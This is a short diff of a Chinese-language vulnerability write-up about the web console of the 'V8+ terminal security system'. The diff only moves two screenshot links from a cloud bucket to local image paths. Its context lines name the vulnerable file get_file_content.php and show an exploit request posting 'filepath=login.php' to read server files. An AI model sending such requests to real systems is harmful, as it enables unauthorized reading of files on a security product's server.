@@ -20,7 +20,7 @@ title="在线安装-V8+终端安全系统Web控制台"
 
 登录页面
 
-![image-20220525150449778](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205251504895.png)
+![image-20220525150449778](./images/202205251504895.png)
 
 存在漏洞的文件`/Console/receive_file/get_file_content.php`
 
@@ -64,4 +64,4 @@ POST /receive_file/get_file_content.php
 filepath=login.php
 ```
 
-![image-20220525150700239](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205251507315.png)
+![image-20220525150700239](./images/202205251507315.png)
